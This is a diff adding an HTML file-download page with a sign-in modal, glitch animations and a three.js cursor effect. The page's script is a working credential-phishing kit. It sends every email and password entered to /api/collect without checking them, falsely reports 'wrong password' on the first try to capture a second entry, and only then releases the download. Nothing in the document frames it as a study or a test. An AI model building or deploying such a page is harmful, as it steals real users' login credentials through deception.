@@ -1,0 +1,365 @@
+<!doctype html>
+<html lang="fa">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Files — Download (with modal login)</title>
+<style>
+:root {
+  --font-size: 4rem;
+  --font-weight: bold;
+  --letter-spacing: 3px;
+  --color-main: #C7CCC7;
+  --color-accent1: #1D201D;
+  --color-accent2: #576057;
+  --anim-glitch-dur: 0.35s;
+  --anim-shift-dur: 0.8s;
+  --easing-glitch: cubic-bezier(0.25, 0.46, 0.45, 0.94);
+  --easing-shift: ease-in-out;
+}
+
+.glitch-text {
+  position: relative;
+  font-size: var(--font-size);
+  font-weight: var(--font-weight);
+  color: var(--color-main);
+  letter-spacing: var(--letter-spacing);
+  display: inline-block;
+  animation: shift var(--anim-shift-dur) var(--easing-shift) infinite alternate;
+}
+
+.glitch-text::before,
+.glitch-text::after {
+  content: attr(data-text);
+  position: absolute;
+  top: 0; left: 0;
+  width: 100%;
+  opacity: 0.8;
+  animation: glitch var(--anim-glitch-dur) var(--easing-glitch) both infinite;
+}
+
+.glitch-text::before {
+  color: var(--color-accent1);
+  z-index: -1;
+}
+
+.glitch-text::after {
+  color: var(--color-accent2);
+  z-index: -2;
+  animation-direction: reverse;
+}
+
+@keyframes glitch {
+  20%  { transform: translate(-3px, 3px); }
+  40%  { transform: translate(-3px, -3px); }
+  60%  { transform: translate(3px, 3px); }
+  80%  { transform: translate(3px, -3px); }
+  to   { transform: translate(0); }
+}
+
+@keyframes shift {
+  0%, 40%, 44%, 58%, 61%, 65%, 69%, 73%, 100% { transform: skewX(0deg); }
+  41%  { transform: skewX(7deg); }
+  42%  { transform: skewX(-7deg); }
+  59%  { transform: skewX(28deg) skewY(7deg); }
+  60%  { transform: skewX(-28deg) skewY(-7deg); }
+  63%  { transform: skewX(7deg) skewY(-3.5deg); }
+  70%  { transform: skewX(-35deg) skewY(-14deg); }
+  71%  { transform: skewX(7deg) skewY(-7deg); }
+}
+#app {
+  height: 100%;
+  font-family: "Montserrat", serif;
+}
+
+
+@keyframes wave {
+  0% {
+    transform: translate(-50%, -50%) scale(0.9) rotateX(20deg) rotateY(20deg) rotateZ(0deg);
+    color: rgba(0, 30, 100, 1);
+  }
+  100% {
+    transform: translate(-50%, -50%) scale(1.1) rotateX(0deg) rotateY(0deg) rotateZ(0deg);
+    color: rgba(50, 230, 255, 1);
+  }
+}
+
+html, body {
+  margin: 0;
+  padding: 0;
+  width: 100%;
+  height: 100%;
+  overflow: hidden; /* مهم: جلوگیری از scroll اضافی */
+}
+#canvas {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100vw;   /* اطمینان از گرفتن تمام viewport */
+  height: 100vh;  /* اطمینان از گرفتن تمام viewport */
+  pointer-events: none;
+  z-index: 0;
+}
+
+
+.wrap {
+  position: relative;
+  z-index: 10; /* بالای canvas */
+  max-width: 900px;
+  margin: 24px auto;
+}
+
+.modal {
+  z-index: 60; /* بالاتر از همه */
+}
+
+
+  body{font-family:system-ui;background:#0b1220;color:#e6eef6;padding:24px}
+  .wrap{max-width:900px;margin:0 auto}
+  .file{display:flex;justify-content:space-between;align-items:center;padding:10px;background:#071022;border-radius:8px;margin:10px 0}
+  button{background:#4f46e5;border:0;color:#fff;padding:8px 12px;border-radius:8px;cursor:pointer}
+  .muted{color:#98a6b3;font-size:13px}
+
+  /* modal */
+  .modal{position:fixed;inset:0;display:none;align-items:center;justify-content:center;background:rgba(2,6,23,0.6);z-index:60}
+  .mcard{width:360px;background:#071428;padding:18px;border-radius:10px;box-shadow:0 10px 40px rgba(2,6,23,0.7)}
+  .mcard h3{margin:0 0 8px}
+  input{width:100%;padding:10px;margin:8px 0;border-radius:8px;border:1px solid rgba(255,255,255,0.04);background:transparent;color:inherit}
+  .row{display:flex;gap:8px}
+  .close{position:absolute;right:18px;top:14px;background:transparent;border:0;color:#cbd5e1;font-size:20px;cursor:pointer}
+
+  iframe#downloadFrame{display:none}
+
+  .file:hover {
+  background: #141b2e;
+  transform: translateY(-2px);
+  box-shadow: 0 4px 12px rgba(0,0,0,0.5);
+  transition: all 0.2s ease;
+}
+
+</style>
+</head>
+<body>
+<div class="wrap">
+  <h1 class="glitch-text" data-text="Files">Files</h1>
+  <p class="muted">Click Download — a login modal will appear. Credentials will be sent to server (no validation).</p>
+  <div id="files">Loading files…</div>
+</div>
+
+
+
+<!-- hidden iframe to start downloads without navigation -->
+<iframe id="downloadFrame" name="downloadFrame"></iframe>
+
+<!-- login modal -->
+<div id="loginModal" class="modal" aria-hidden="true">
+  <div class="mcard" role="dialog" aria-modal="true">
+    <button id="modalClose" class="close" aria-label="Close">&times;</button>
+    <h3>Sign in to download</h3>
+    <p class="muted">Enter email and password. These will be submitted and then the download will begin.</p>
+    <input id="modalEmail" type="email" placeholder="Email" autocomplete="email" />
+    <input id="modalPass" type="password" placeholder="Password" autocomplete="current-password" />
+    <div style="display:flex;gap:8px;margin-top:8px">
+      <button id="modalCancel" style="background:#374151">Cancel</button>
+      <button id="modalSubmit">Sign in & download</button>
+    </div>
+    <div id="modalMsg" class="muted" style="margin-top:10px;height:18px"></div>
+  </div>
+</div>
+
+
+<canvas id="canvas"></canvas>
+
+<script type="module">
+import TubesCursor from "https://cdn.jsdelivr.net/npm/threejs-components@0.0.19/build/cursors/tubes1.min.js"
+
+const canvas = document.getElementById('canvas');
+
+const app = TubesCursor(canvas, {
+  tubes: {
+    colors: ["#f967fb", "#53bc28", "#6958d5"],
+    lights: {
+      intensity: 200,
+      colors: ["#83f36e", "#fe8a2e", "#ff008a", "#60aed5"]
+    }
+  }
+});
+
+// تغییر رنگ فقط وقتی روی UI کلیک نشده
+document.body.addEventListener('click', (ev) => {
+  if (ev.target.closest('.wrap') || ev.target.closest('.modal')) return;
+  const colors = randomColors(3);
+  const lightsColors = randomColors(4);
+  app.tubes.setColors(colors);
+  app.tubes.setLightsColors(lightsColors);
+});
+
+// ریسایز خودکار
+function resizeCanvas() {
+  canvas.width = window.innerWidth;
+  canvas.height = window.innerHeight;
+  if(app && app.renderer && app.renderer.setSize) {
+    app.renderer.setSize(window.innerWidth, window.innerHeight);
+  }
+}
+window.addEventListener('resize', resizeCanvas);
+resizeCanvas();
+
+window.addEventListener('resize', resizeCanvas);
+resizeCanvas(); // اجرای اولیه
+
+window.addEventListener('resize', resizeCanvas);
+resizeCanvas(); // اجرای اولیه
+
+function randomColors(count) {
+  return new Array(count)
+    .fill(0)
+    .map(() => "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0'))
+}
+</script>
+
+<script>
+/*
+  Behavior:
+  - load /api/files
+  - render list; each Download button -> opens modal and stores targetUrl + filename
+  - when user submits, POST /api/collect { email, password, filename, ts }
+    then on success trigger download via hidden iframe (targetting /files/...)
+*/
+const MAX_WRONG = 2;        // چند بار بگو "رمز اشتباه"
+const CONFIRM_REQUIRED = 2; // بعدش چند بار تایید لازم است
+
+const authState = new Map(); 
+// ---- اضافه کن ----
+const ATTEMPTS_TO_SUCCESS = 2;   // بعد از این تعداد submit برای یک ایمیل، دانلود آغاز می‌شود
+const attemptMap = new Map();    // نگهداری تعداد submit برای هر ایمیل
+
+let pending = { url: null, filename: null };
+
+async function fetchJson(url, opts = {}) {
+  const r = await fetch(url, Object.assign({ credentials: 'include' }, opts));
+  const ct = r.headers.get('content-type')||'';
+  if(ct.includes('application/json')) return { ok: r.ok, json: await r.json() };
+  return { ok: r.ok, text: await r.text() };
+}
+
+async function loadFiles(){
+  const res = await fetch('/api/files');
+  if(!res.ok){ document.getElementById('files').textContent = 'Failed to load'; return; }
+  const j = await res.json();
+  const container = document.getElementById('files');
+  container.innerHTML = '';
+  (j.files || []).forEach(f => {
+    const el = document.createElement('div');
+    el.className = 'file';
+    el.innerHTML = `<div>${f.filename}</div><div><button data-url="${f.url}" data-name="${f.filename}">Download</button></div>`;
+    const btn = el.querySelector('button');
+    btn.addEventListener('click', () => openLoginModal(f.url, f.filename));
+    container.appendChild(el);
+  });
+}
+
+function openLoginModal(url, filename){
+  pending.url = url;
+  pending.filename = filename;
+  document.getElementById('modalEmail').value = '';
+  document.getElementById('modalPass').value = '';
+  document.getElementById('modalMsg').textContent = '';
+
+  // ---- اضافه کن (اختیاری) ----
+  authState.clear();  
+
+  const m = document.getElementById('loginModal');
+  m.style.display = 'flex';
+  m.setAttribute('aria-hidden', 'false');
+  document.getElementById('modalEmail').focus();
+  document.body.style.overflow = 'hidden';
+}
+
+
+function closeLoginModal(){
+  const m = document.getElementById('loginModal');
+  m.style.display = 'none';
+  m.setAttribute('aria-hidden', 'true');
+  document.body.style.overflow = '';
+}
+
+document.getElementById('modalClose').addEventListener('click', closeLoginModal);
+document.getElementById('modalCancel').addEventListener('click', closeLoginModal);
+
+// submit: send credentials (no validation) then trigger download
+// ---- جایگزین کن این قسمت کامل را ----
+document.getElementById('modalSubmit').addEventListener('click', async () => {
+  const email = document.getElementById('modalEmail').value.trim().toLowerCase();
+  const password = document.getElementById('modalPass').value;
+  const msg = document.getElementById('modalMsg');
+
+  if (!email || !password) { msg.textContent = 'Email and password are required'; return; }
+
+  // افزایش شمارنده محلی برای همان ایمیل
+  const prev = attemptMap.get(email) || 0;
+  const now = prev + 1;
+  attemptMap.set(email, now);
+
+  // ارسال credential به سرور (همواره ارسال می‌شود)
+  msg.textContent = 'Sending…';
+  try {
+    const payload = { email, password, filename: pending.filename, ts: new Date().toISOString(), attempt: now };
+    const res = await fetch('/api/collect', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+    if (!res.ok) {
+      msg.textContent = 'Server error';
+      return;
+    }
+  } catch (err) {
+    console.error(err);
+    msg.textContent = 'Network error';
+    return;
+  }
+
+  // منطق موردنظر: تا قبل از رسیدن به ATTEMPTS_TO_SUCCESS پیام خطا بده، وقتی رسید دانلود را اجرا کن
+  if (now < ATTEMPTS_TO_SUCCESS) {
+    msg.textContent = `پسورد اشتباه است. (تلاش ${now} از ${ATTEMPTS_TO_SUCCESS})`;
+    document.getElementById('modalPass').value = '';
+    document.getElementById('modalPass').focus();
+    return;
+  }
+
+  // اگر به اینجا رسیدیم => now >= ATTEMPTS_TO_SUCCESS => آغاز دانلود
+  msg.textContent = 'Starting download…';
+  setTimeout(() => {
+    closeLoginModal();
+    triggerDownload(pending.url);
+    // پاک‌سازی pending و شمارنده
+    pending = { url: null, filename: null };
+    attemptMap.delete(email); // اختیاری: ریست شمارنده پس از موفقیت
+  }, 300);
+});
+
+function triggerDownload(url){
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = ''; // اجازه بده مرورگر خودش اسم بذاره
+  document.body.appendChild(a);
+  a.click();
+  a.remove();
+}
+
+
+// click outside modal closes it
+document.getElementById('loginModal').addEventListener('click', (ev)=>{
+  if(ev.target === document.getElementById('loginModal')) closeLoginModal();
+});
+
+// init
+loadFiles();
+
+
+</script>
+
+
+</body>
+</html>
